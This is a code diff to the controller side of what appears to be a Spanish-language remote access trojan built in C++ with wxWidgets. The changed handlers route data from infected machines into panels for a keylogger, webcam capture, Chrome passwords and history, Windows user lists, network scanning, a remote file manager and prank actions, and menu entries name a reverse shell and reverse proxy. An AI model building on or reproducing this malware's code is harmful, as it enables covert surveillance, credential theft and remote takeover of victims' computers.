@@ -11,9 +11,11 @@
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
 #include "panel_wmanager.hpp"
+#include "panel_informacion.hpp"
 #include "panel_info_chrome.hpp"
 #include "panel_usuarios.hpp"
 #include "panel_escaner.hpp"
+#include "panel_fun.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -233,38 +235,34 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //Listar directorio
     if (iComando == EnumComandos::FM_Dir_Folder) {
-        if (this->m_isFrameVisible()) {
-            try {
-                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
-                if (temp_list) {
-                    temp_list->ListarDir(paquete.cBuffer.data());
-                }
-            }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+        try {
+            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-FM-LIST");
+            if (temp_list) {
+                temp_list->ListarDir(paquete.cBuffer.data());
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
     //Listar dispositivos de almacenamiento
     if (iComando == EnumComandos::FM_Discos_Lista) {
-        if (this->m_isFrameVisible()) {
-            try {
-                std::vector<std::string> vDrives = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 100);
+        try {
+            std::vector<std::string> vDrives = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 100);
 
-                if (vDrives.size() > 0) {
-                    ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List);//, this->n_Frame);
-                    if (temp_list) {
-                        temp_list->ListarEquipo(vDrives);
-                    }
-
+            if (vDrives.size() > 0) {
+                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-FM-LIST");
+                if (temp_list) {
+                    temp_list->ListarEquipo(vDrives);
                 }
-            }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
@@ -325,30 +323,28 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //Paquet de editor de texto remoto
     if (iComando == EnumComandos::FM_Editar_Archivo_Paquete) {
-        if (this->m_isFrameVisible()) {
-            try {
-                vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
-                if (vcDatos.size() == 1) {
-                    //Tama�o del id del comando, id del archivo y dos back slashes
-                    int iHeadSize = vcDatos[0].size() + 1;
-                    const char* cBytes = paquete.cBuffer.data() + iHeadSize;
+        try {
+            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
+            if (vcDatos.size() == 1) {
+                //Tama�o del id del comando, id del archivo y dos back slashes
+                int iHeadSize = vcDatos[0].size() + 1;
+                const char* cBytes = paquete.cBuffer.data() + iHeadSize;
 
-                    wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[0]);// , this->n_Frame);
-                    if (temp_edit_form) {
-                        temp_edit_form->AgregarTexto(cBytes);
-                    }
-                    else {
-                        this->Log("No se pudo encontrar la ventana con id " + vcDatos[0]);
-                    }
+                wxEditForm* temp_edit_form = (wxEditForm*)wxWindow::FindWindowByName(vcDatos[0]);// , this->n_Frame);
+                if (temp_edit_form) {
+                    temp_edit_form->AgregarTexto(cBytes);
                 }
                 else {
-                    DEBUG_MSG("No se pudo parsear el contenido de edicion remota:");
-                    DEBUG_MSG(paquete.cBuffer.data());
+                    this->Log("No se pudo encontrar la ventana con id " + vcDatos[0]);
                 }
             }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+            else {
+                DEBUG_MSG("No se pudo parsear el contenido de edicion remota:");
+                DEBUG_MSG(paquete.cBuffer.data());
             }
+        }
+        catch (const std::exception& e) {
+            wxMessageBox(e.what(), "Exception");
         }
         return;
     }
@@ -371,21 +367,19 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //El cliente envio la ruta actual del administrador de archivos
     if (iComando == EnumComandos::FM_CPATH) {
-        if (this->m_isFrameVisible()) {
-            try {
-                panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM);// , this->n_Frame);
-                if (temp_panel) {
-                    const char* cBuff = paquete.cBuffer.data();
-                    temp_panel->ActualizarRuta(cBuff);
-                }
-                else {
-                    this->Log("No se pudo encontrar panel FM activo");
-                }
+        try {
+            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowByName(this->p_Cliente._id + "-FM");
+            if (temp_panel) {
+                const char* cBuff = paquete.cBuffer.data();
+                temp_panel->ActualizarRuta(cBuff);
             }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+            else {
+                this->Log("No se pudo encontrar panel FM activo");
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
@@ -425,40 +419,36 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //mod camara - Lista de dispositivos
     if (iComando == EnumComandos::CM_Lista_Salida) {
-        if (this->m_isFrameVisible()) {
-            try {
-                panelCamara* temp_panel_cam = (panelCamara*)wxWindow::FindWindowById(EnumCamMenu::ID_Main_Panel);// , this->n_Frame);
-                if (temp_panel_cam) {
-                    const char* cBuff = paquete.cBuffer.data();
-                    temp_panel_cam->ProcesarLista(cBuff);
-                }
-            }catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+        try {
+            panelCamara* temp_panel_cam = (panelCamara*)wxWindow::FindWindowByName(this->p_Cliente._id + "-CAM");
+            if (temp_panel_cam) {
+                const char* cBuff = paquete.cBuffer.data();
+                temp_panel_cam->ProcesarLista(cBuff);
             }
+        }catch (const std::exception& e) {
+            wxMessageBox(e.what(), "Exception");
         }
         return;
     }
 
     //mod camara - Buffer de video de la camara
     if (iComando == EnumComandos::CM_Single_Salida) {
-        if (this->m_isFrameVisible()) {
-            try {
-                vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
-                if (vcDatos.size() == 1) {
-                    int iHeadSize = vcDatos[0].size() + 1; //len del id del dev
-                    int iBuffSize = iRecibido - iHeadSize - 1;
-                    const char* cBytes = paquete.cBuffer.data() + iHeadSize;
-                    panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[0]);// , this->n_Frame);
-                    if (panel_picture) {
-                        panel_picture->OnDrawBuffer(cBytes, iBuffSize);
-                    }
-                    else {
-                        this->Log("[X] No se pudo encontrar el panel de camara");
-                    }
+        try {
+            vcDatos = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
+            if (vcDatos.size() == 1) {
+                int iHeadSize = vcDatos[0].size() + 1; //len del id del dev
+                int iBuffSize = iRecibido - iHeadSize - 1;
+                const char* cBytes = paquete.cBuffer.data() + iHeadSize;
+                panelPictureBox* panel_picture = (panelPictureBox*)wxWindow::FindWindowByName("CAM" + vcDatos[0]);// , this->n_Frame);
+                if (panel_picture) {
+                    panel_picture->OnDrawBuffer(cBytes, iBuffSize);
                 }
-            }catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+                else {
+                    this->Log("[X] No se pudo encontrar el panel de camara");
+                }
             }
+        }catch (const std::exception& e) {
+            wxMessageBox(e.what(), "Exception");
         }
         return;
     }
@@ -555,59 +545,51 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //mod informacion - Lista perfiles chrome
     if (iComando == EnumComandos::INF_Chrome_Profiles_Out) {
-        if (this->m_isFrameVisible()) {
-            try{
-                panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Info, this->n_Frame);
-                if (temp_pn) {
-                    std::string strData(paquete.cBuffer.data());
-                    temp_pn->m_AgregarDataPerfiles(strData);
-                }
-            }catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+        try{
+            panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowByName(this->p_Cliente._id + "-INF-CHROME");
+            if (temp_pn) {
+                std::string strData(paquete.cBuffer.data());
+                temp_pn->m_AgregarDataPerfiles(strData);
             }
+        }catch (const std::exception& e) {
+            wxMessageBox(e.what(), "Exception");
         }
         return;
     }
 
     //mod informacion - Procesar informacion de perfil (historial/passwords/descargas)
     if (iComando == EnumComandos::INF_Chrome_Profile_Data_Out) {
-        if (this->m_isFrameVisible()) {
-            try {
-                panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Info, this->n_Frame);
-                if (temp_pn) {
-                    std::string strData(paquete.cBuffer.data());
-                    temp_pn->m_ProcesarInfoPerfil(strData);
-                }
-            }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+        try {
+            panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowByName(this->p_Cliente._id + "-INF-CHROME");
+            if (temp_pn) {
+                std::string strData(paquete.cBuffer.data());
+                temp_pn->m_ProcesarInfoPerfil(strData);
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
     //mod informacion - No se pudo obtener la informacion solicitada
     if (iComando == EnumComandos::INF_Error) {
-        if (this->m_isFrameVisible()) {
-            wxMessageBox("No se pudo obtener la informacion", "Error", 5L, this->n_Frame);
-        }
+            wxMessageBox("No se pudo obtener la informacion", "Error", 5L);
         return;
     }
 
     //mod informacion - Informacion de usuarios de windows
     if (iComando == EnumComandos::INF_Users) {
-        if (this->m_isFrameVisible()) {
-            try {
-                panelUsuarios* temp_pn = (panelUsuarios*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Info_Usuarios, this->n_Frame);
-                if (temp_pn) {
-                    std::string strData(paquete.cBuffer.data());
-                    temp_pn->m_ProcesarDatos(strData);
-                }
-            }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+        try {
+            panelUsuarios* temp_pn = (panelUsuarios*)wxWindow::FindWindowByName(this->p_Cliente._id + "-INF-USR");
+            if (temp_pn) {
+                std::string strData(paquete.cBuffer.data());
+                temp_pn->m_ProcesarDatos(strData);
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
@@ -621,20 +603,19 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
     //mod escaner red
     if (iComando == EnumComandos::Net_Scan || iComando == EnumComandos::Net_Scan_Sck || iComando == EnumComandos::Net_Scan_Syn ||
         iComando == EnumComandos::Net_Scan_Full_Syn || iComando == EnumComandos::Net_Scan_Full_Sck) {
-        if (this->m_isFrameVisible()) {
-            try {
-                panelEscaner* temp_pn = (panelEscaner*)wxWindow::FindWindowById(EnumEscanerIDS::Main_Window, this->n_Frame);
-                if (temp_pn) {
-                    //this->n_Frame->panelScaner->AddData(paquete.cBuffer.data());
-                }
-                else {
-                    DEBUG_MSG("[!] No se pudo encontrar ventana de escaner de red");
-                }
+        try {
+            panelEscaner* temp_pn = (panelEscaner*)wxWindow::FindWindowByName(this->p_Cliente._id + "-NET");
+            if (temp_pn) {
+                temp_pn->AddData(paquete.cBuffer.data());
+                //this->n_Frame->panelScaner->AddData(paquete.cBuffer.data());
             }
-            catch (const std::exception& e) {
-                wxMessageBox(e.what(), "Exception");
+            else {
+                DEBUG_MSG("[!] No se pudo encontrar ventana de escaner de red");
             }
         }
+        catch (const std::exception& e) {
+                wxMessageBox(e.what(), "Exception");
+            }
         return;
     }
 
@@ -1574,7 +1555,7 @@ void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
                 }
 
                 //Admin de Procesos
-                if (item == "Administrador de Archivos") {
+                if (item == "Admin Procesos") {
                     menu.Append(EnumMenuMods::ID_OnAdminProcesos, item);
                     continue;
                 }
@@ -1698,22 +1679,6 @@ void MyListCtrl::OnMatarProceso(wxCommandEvent& event) {
 }
 
 //Eventos menu de mods habilitados
-void MyListCtrl::OnShellInversa(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnMicrofono(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnKeylogger(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnCamara(wxCommandEvent& event) {
-    event.Skip();
-}
-
 void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     const int menuID = event.GetId();
 
@@ -1738,33 +1703,19 @@ void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     }else if (menuID == EnumMenuMods::ID_OnAdminVentanas) {
         panelWManager* panelWM = new panelWManager(this, tmpSocket, this->strTmp.ToStdString());
         panelWM->Show();
+    }else if (menuID == EnumMenuMods::ID_OnInfo) {
+        panelInformacion* panelINF = new panelInformacion(this, tmpSocket, this->strTmp.ToStdString());
+        panelINF->Show();
+    }else if (menuID == EnumMenuMods::ID_OnEscanerRed) {
+        panelEscaner* panelSCAN = new panelEscaner(this, tmpSocket, this->strTmp.ToStdString());
+        panelSCAN->Show();
+    }else if (menuID == EnumMenuMods::ID_OnBromas) {
+        panelFun* panelFUN = new panelFun(this, tmpSocket, this->strTmp.ToStdString());
+        panelFUN->Show();
+    }else if (menuID == EnumMenuMods::ID_OnAdminArchivos) {
+        panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp);
+        panelFM->Show();
     }
-}
-
-
-
-void MyListCtrl::OnEscritorioRemoto(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnAdminVentanas(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnInfo(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnEscanerRed(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnBromas(wxCommandEvent& event) {
-    event.Skip();
-}
-
-void MyListCtrl::OnAdminArchivos(wxCommandEvent& event) {
-    event.Skip();
 }
 
 void MyListCtrl::OnProxyInversa(wxCommandEvent& event) {
